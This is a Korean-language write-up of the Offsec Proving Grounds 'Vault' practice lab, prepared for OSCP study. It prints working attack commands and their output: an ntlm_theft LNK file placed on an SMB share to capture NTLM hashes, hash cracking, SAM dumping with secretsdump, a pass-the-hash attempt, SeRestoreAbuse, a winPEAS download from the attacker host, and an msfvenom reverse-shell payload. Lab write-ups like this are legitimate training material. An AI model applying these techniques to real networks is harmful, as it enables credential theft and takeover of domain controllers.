# 0. Offsec Proving Grounds Walkthrough for OSCP prep

> A foothold on the target will be gained by using a writable SMB share to execute a URI file attack. Following this, SYSTEM privilege will be elevated by abusing write access on a Group Policy Object. This lab focuses on exploiting SMB vulnerabilities and privilege escalation techniques.
# 1. Recon

## 1.1. nmap

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# nmap -p- --min-rate 1000 $IP -oG all_ports.gnmap
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 18:17 +04
Nmap scan report for 192.168.125.172
Host is up (0.078s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49703/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 115.91 seconds

┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# ports=$(grep -oP '\d+(?=/open)' all_ports.gnmap | paste -sd "," -)

┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# nmap -sV -A -p$ports --min-rate 5000 $IP
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-14 19:42 +04
Nmap scan report for 192.168.125.172
Host is up (0.078s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-14 15:42:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-14T15:43:59+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-14T15:43:20+00:00
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2026-02-13T14:16:11
|_Not valid after:  2026-08-15T14:16:11
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-02-14T15:43:24
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   77.75 ms 192.168.45.1
2   77.74 ms 192.168.45.254
3   77.83 ms 192.168.251.1
4   77.85 ms 192.168.125.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.58 seconds
```

## 1.2. SMB enum

`smb` 로 훑어봤을 때 공유 폴더 목록은 나왔지만 `DocumentsShare` 라던가 `NETLOGON` 또는 `SYSVOL` 에 아무것도 들어있지 않았다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# smbclient -N -L //$IP

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DocumentsShare  Disk
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.125.172 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

## 1.3. Kerbrute userenum 시도 - fail

`kerbrute` 로 `userenum` 을 통해 크리덴셜 확보를 하려고 했지만 실패했다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# kerbrute userenum -d vault.offsec --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 02/14/26 - Ronnie Flathers @ropnop

2026/02/14 20:17:05 >  Using KDC(s):
2026/02/14 20:17:05 >  	192.168.125.172:88

2026/02/14 20:17:10 >  [+] VALID USERNAME:	 guest@vault.offsec
2026/02/14 20:17:20 >  [+] VALID USERNAME:	 administrator@vault.offsec
2026/02/14 20:18:57 >  [+] VALID USERNAME:	 Guest@vault.offsec
2026/02/14 20:18:57 >  [+] VALID USERNAME:	 Administrator@vault.offsec
2026/02/14 20:24:49 >  [+] VALID USERNAME:	 GUEST@vault.offsec
^C
```

## 1.4. ntlm_theft

다시 smb로 돌아가서 업로드를 테스트해 본다. 그리고 정상적으로 업로드가 되는 거를 확인할 수 있다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# echo 'test' > test

┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# smbclient -N //$IP/DocumentsShare
Try "help" to get a list of possible commands.
smb: \> put test
putting file test as \test (0.0 kb/s) (average 0.0 kb/s)
smb: \> ls
  .                                   D        0  Sat Feb 14 20:50:51 2026
  ..                                  D        0  Sat Feb 14 20:50:51 2026
  test                                A        5  Sat Feb 14 20:50:51 2026

		7706623 blocks of size 4096. 1061353 blocks available
```

`ntlm_theft` 를 이용해서 임의의 링크 파일을 하나 만든다. 

여기서 이 행동을 하는 이유는 Windows 의 NTLM 인증 취약점을 이용하는 것이다. 서버에게 내 서버로 접속을 유도한 다음에, 접속을 시도할 때는 NTLM 을 가로채는 방식이다. 그래서 응답을 가로채기 위한 악성 파일을 업로드를 할 것이다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# python /home/kali/labs/Flight/ntlm_theft/ntlm_theft.py -g lnk -s $IP -f vault
/home/kali/labs/Flight/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: vault/vault.lnk (BROWSE TO FOLDER)
Generation Complete.
```

다시 접속해서 `vault.lnk` 파일을 업로드 한다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault/vault]
└─# smbclient -N //$IP/DocumentsShare
Try "help" to get a list of possible commands.
smb: \> put vault.lnk
putting file vault.lnk as \vault.lnk (9.0 kb/s) (average 9.0 kb/s)
smb: \> 
```

그러면 아래와 같이 인증 정보가 날아온다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault/vault]
└─# impacket-smbserver -smb2support share .
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.125.172,50914)
[*] AUTHENTICATE_MESSAGE (VAULT\anirudh,DC)
[*] User DC\anirudh authenticated successfully
[*] anirudh::VAULT:aaaaaaaaaaaaaaaa:1233e416f4fccb69c7561ead16995624:010100000000000080c4147fd39ddc01c94dc813e628d7fa0000000001001000710066006200780063007a004100760003001000710066006200780063007a0041007600020010006700540073004d005500740074006f00040010006700540073004d005500740074006f000700080080c4147fd39ddc01060004000200000008003000300000000000000001000000002000001830f0c706803f0173332094f5b2bb5fb0c4dad79922348512363cc7dc51c8100a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310035000000000000000000
[*] Closing down connection (192.168.125.172,50914)
[*] Remaining connections []
[*] Incoming connection (192.168.125.172,50920)
[*] AUTHENTICATE_MESSAGE (VAULT\anirudh,DC)
[*] User DC\anirudh authenticated successfully
```

## 1.5. ANIRUDH Password cracking

위에서 얻은 정보를 `hashcat` 으로 5600번 크랙하면 아래와 같은 결과가 나온다. `ANIRUDH:SecureHM` 의 크리덴셜을 얻을 수 있었다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt

[...SNIP...]

ANIRUDH::VAULT:aaaaaaaaaaaaaaaa:1233e416f4fccb69c7561ead16995624:010100000000000080c4147fd39ddc01c94dc813e628d7fa0000000001001000710066006200780063007a004100760003001000710066006200780063007a0041007600020010006700540073004d005500740074006f00040010006700540073004d005500740074006f000700080080c4147fd39ddc01060004000200000008003000300000000000000001000000002000001830f0c706803f0173332094f5b2bb5fb0c4dad79922348512363cc7dc51c8100a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003200310035000000000000000000:SecureHM
```

## 1.6. anirudh 계정의 SMB enum

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# smbclient -U "anirudh"%"SecureHM" //$IP/NETLOGON
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 19 12:50:25 2021
  ..                                  D        0  Fri Nov 19 12:50:25 2021

		7706623 blocks of size 4096. 1060502 blocks available
smb: \> quit

┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# smbclient -U "anirudh"%"SecureHM" //$IP/SYSVOL
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 19 12:50:25 2021
  ..                                  D        0  Fri Nov 19 12:50:25 2021
  vault.offsec                       Dr        0  Fri Nov 19 12:50:25 2021

		7706623 blocks of size 4096. 1060502 blocks available
```

`SYSVOL` 디렉토리로 들어가면 `vault.offsec` 을 발견할 수 있는데 그 안의 내용물들을 나열해보면 아래와 같다. 

```bash
smb: \> recurse ON
smb: \> ls
  .                                   D        0  Fri Nov 19 12:50:25 2021
  ..                                  D        0  Fri Nov 19 12:50:25 2021
  vault.offsec                       Dr        0  Fri Nov 19 12:50:25 2021

\vault.offsec
  .                                   D        0  Fri Nov 19 12:56:39 2021
  ..                                  D        0  Fri Nov 19 12:56:39 2021
  DfsrPrivate                      DHSr        0  Fri Nov 19 12:56:39 2021
  Policies                            D        0  Fri Nov 19 12:50:34 2021
  scripts                             D        0  Fri Nov 19 12:50:25 2021

\vault.offsec\DfsrPrivate
NT_STATUS_ACCESS_DENIED listing \vault.offsec\DfsrPrivate\*

\vault.offsec\Policies
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Fri Nov 19 12:50:34 2021
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Fri Nov 19 12:50:34 2021

\vault.offsec\scripts
  .                                   D        0  Fri Nov 19 12:50:25 2021
  ..                                  D        0  Fri Nov 19 12:50:25 2021

\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021
  GPT.INI                             A       22  Fri Nov 19 12:59:32 2021
  MACHINE                             D        0  Fri Nov 19 12:57:27 2021
  USER                                D        0  Fri Nov 19 12:50:34 2021

\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021
  GPT.INI                             A       22  Fri Nov 19 12:50:34 2021
  MACHINE                             D        0  Fri Nov 19 12:50:34 2021
  USER                                D        0  Fri Nov 19 12:50:34 2021

\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
  .                                   D        0  Fri Nov 19 12:57:27 2021
  ..                                  D        0  Fri Nov 19 12:57:27 2021
  Microsoft                           D        0  Fri Nov 19 12:50:34 2021
  Registry.pol                        A     2786  Fri Nov 19 12:57:27 2021

\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021

\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021
  Microsoft                           D        0  Fri Nov 19 12:50:34 2021

\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021

\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021
  Windows NT                          D        0  Fri Nov 19 12:50:34 2021

\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021
  Windows NT                          D        0  Fri Nov 19 12:50:34 2021

\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021
  SecEdit                             D        0  Fri Nov 19 12:59:32 2021

\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021
  SecEdit                             D        0  Fri Nov 19 12:50:34 2021

\vault.offsec\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Fri Nov 19 12:59:32 2021
  ..                                  D        0  Fri Nov 19 12:59:32 2021
  GptTmpl.inf                         A     1098  Fri Nov 19 12:59:32 2021

\vault.offsec\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
  .                                   D        0  Fri Nov 19 12:50:34 2021
  ..                                  D        0  Fri Nov 19 12:50:34 2021
  GptTmpl.inf                         A     3764  Fri Nov 19 12:50:34 2021
```

위에서 찾은 파일들 중 특별해 보이는 것들을 아래에서 확인해 보았지만, 딱히 특별한 거는 없었다. 
### 1.6.1. Registry.pol 

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# strings -e l Registry.pol
[Software\Policies\Microsoft\SystemCertificates\EFS
;EFSBlob
][Software\Policies\Microsoft\SystemCertificates\EFS\Certificates\E740D00DCAC9C85F19F932C76F2AC1FB43C8141F
;Blob
7d455d24-61a8-4ef6-9ece-4d9676a61a15
Microsoft Enhanced Cryptographic Provider v1.0
][Software\Policies\Microsoft\SystemCertificates\EFS\CRLs
;][Software\Policies\Microsoft\SystemCertificates\EFS\CTLs
```

### 1.6.2. GptTmpl.inf

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# cat GptTmpl.inf
��[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
SeAuditPrivilege = *S-1-5-20,*S-1-5-19
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-90-0,*S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
SeInteractiveLogonRight = *S-1-5-9,*S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
[Version]
signature="$CHICAGO$"
Revision=1
```

### 1.6.3. GPT.INI

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# cat GPT.INI
[General]
Version=4
```

## 1.7. GetUserSPNs

혹시나 `SPN` 계정이 존재할까 싶어서 긇어 보았지만 아무것도 없었다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# impacket-GetUserSPNs vault.offsec/anirudh:'SecureHM' -dc-ip $IP -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

No entries found!
```

# 2. Initial Access 
## 2.1. winrm 

처음부터 `winrm` 되는지 시험해볼껄.. 안 될꺼라고 믿고 그냥 안 하고 맨 마지막에 정말 할 거 없어서 시도했는데 성공해서 기운이 빠진다. 

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# evil-winrm -u anirudh -p 'SecureHM' -i $IP

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\anirudh\Documents>
```

# 3. Privesc

## 3.1. whoami /priv

```bash
*Evil-WinRM* PS C:\Users\anirudh\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```

`SeBackupPrivilege` 권한을 확인해서 아래와 같이 `sam` 파일과 `system` 파일을 덤프를 했다. 

```bash
*Evil-WinRM* PS C:\Users\anirudh\Desktop> download sam

Info: Downloading C:\Users\anirudh\Desktop\sam to sam

Info: Download successful!
*Evil-WinRM* PS C:\Users\anirudh\Desktop> download system

Info: Downloading C:\Users\anirudh\Desktop\system to system

Info: Download successful!
```

## 3.2. impacket-secretsdump

`secretsdump` 를 통해서 `administrator` 의 해쉬 데이터를 추출한다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# impacket-secretsdump -sam sam -system system LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887dc36:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```

### 3.2.1. hash 복호화

추출한 해쉬를 hashcat 으로 복호화를 시도했지만 어림도 없었다. 이렇게 쉽게 끝날 거 같지 않았기 때문이다.

```bash
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 608339ddc8f434ac21945e026887dc36
Time.Started.....: Sat Feb 14 21:25:56 2026 (1 sec)
Time.Estimated...: Sat Feb 14 21:25:57 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 11013.6 kH/s (0.05ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[206b72697374656e616e6e65] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 45%
```

### 3.2.2. PtH 공격 시도

마찬가지로 `PtH` 공격을 시도해 보았다. 하지만 아무런 응답이 없어서 정상 작동하지 않는 것으로 판단했다. 

```bash
┌──(root㉿kali)-[/usr/share/peass/winpeas]
└─# evil-winrm -u administrator -H 608339ddc8f434ac21945e026887dc36 -i $IP

Evil-WinRM shell v3.7

Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

## 3.3. Program Files

`Program Files` 폴덜들을 뒤져봤지만 특별하게 설치된 파일들은 존재하지 않았다. 

```bash
*Evil-WinRM* PS C:\> cd "Program Files"
*Evil-WinRM* PS C:\Program Files> ls


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/28/2021   6:05 AM                Common Files
d-----         9/1/2021   9:04 AM                internet explorer
d-----        5/28/2021   6:06 AM                VMware
d-r---        5/28/2021   4:32 AM                Windows Defender
d-----       11/18/2021  11:12 PM                Windows Defender Advanced Threat Protection
d-----        7/15/2021  12:28 PM                Windows Mail
d-----        5/28/2021   4:21 AM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        5/28/2021   4:21 AM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d-----        9/15/2018  12:19 AM                WindowsPowerShell


*Evil-WinRM* PS C:\Program Files> cd ..
*Evil-WinRM* PS C:\> cd "Program Files (x86)"
*Evil-WinRM* PS C:\Program Files (x86)> ls


    Directory: C:\Program Files (x86)


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/15/2018  12:28 AM                Common Files
d-----         9/1/2021   9:04 AM                Internet Explorer
d-----        9/15/2018  12:19 AM                Microsoft.NET
d-----        5/28/2021   4:21 AM                Windows Defender
d-----        7/15/2021  12:28 PM                Windows Mail
d-----        5/28/2021   4:21 AM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        5/28/2021   4:21 AM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                WindowsPowerShell
```

## 3.4. winPEAS

권한상승을 어떻게 해야할지 몰라서 `winPEAS` 로 전체적인 점검을 실시한다. 

```bash
*Evil-WinRM* PS C:\Users\anirudh\Desktop> wget http://192.168.45.215/winPEASx64.exe -o win.exe
*Evil-WinRM* PS C:\Users\anirudh\Desktop> ls


    Directory: C:\Users\anirudh\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/14/2026   9:29 PM             34 local.txt
-a----        2/14/2026   9:39 PM       10144256 win.exe
```

그 중에서 `system32` 에 대해서 쓰기 권한이 있는 거를 확인할 수 있었다. 

```bash
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\anirudh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: anirudh [AllAccess]
    File: C:\Users\anirudh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\anirudh\AppData\Roaming\Microsoft\Windows,C:\Users\anirudh\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    FilePerms: anirudh [AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================
```

## 3.5. schtasks 를 이용한 새로운 task 추가 시도

위에서 나온 경로에 임의의 파일을 생성하는 거를 테스트 해봤다.

```bash
*Evil-WinRM* PS C:\Windows\system32> echo "test" > C:\windows\tasks\test.txt
*Evil-WinRM* PS C:\Windows\system32> dir C:\windows\tasks\test.txt


    Directory: C:\windows\tasks


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/14/2026  10:18 PM             14 test.txt
```

정상적으로 쓰기가 가능한 거를 볼 수 있었으니 `schtasks` 를 통해서 `tasks` 폴더 안에 있는 내용을 실행하게 만드려고 했으나, `schtasks` 의 실행 권한이 막혔기 때문에 추가적인 작업은 진행할 수 없었다.

```bash
*Evil-WinRM* PS C:\Windows\system32> schtasks
Program 'schtasks.exe' failed to run: Access is deniedAt line:1 char:1
+ schtasks
+ ~~~~~~~~.
At line:1 char:1
+ schtasks
+ ~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed
```

## 3.6. SeRestorePrivilege Abuse 

`whoami /priv` 에서 `SeRestorePrivilege` 의 권한을 확인할 수 있었다. 해당 권한을 악용하기 위해 `SeRestoreAbuse.exe` 를 이용할 것이다. 해당 바이너리는 아래의 링크에서 다운받을 수 있다.

https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe?source=post_page-----158516460860---------------------------------------

```bash
*Evil-WinRM* PS C:\Users\anirudh\Desktop> upload SeRestoreAbuse.exe

Info: Uploading /home/kali/PG/Vault/SeRestoreAbuse.exe to C:\Users\anirudh\Desktop\SeRestoreAbuse.exe

Data: 22528 bytes of 22528 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\anirudh\Desktop> ls


    Directory: C:\Users\anirudh\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/14/2026   9:29 PM             34 local.txt
-a----        2/14/2026  10:33 PM          16896 SeRestoreAbuse.exe
```

아래와 같이 `msfvenom` 을 통해 리버스쉘을 맺을 바이너리를 생성한다.

```bash
┌──(root㉿kali)-[/home/kali/PG/Vault]
└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=80 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

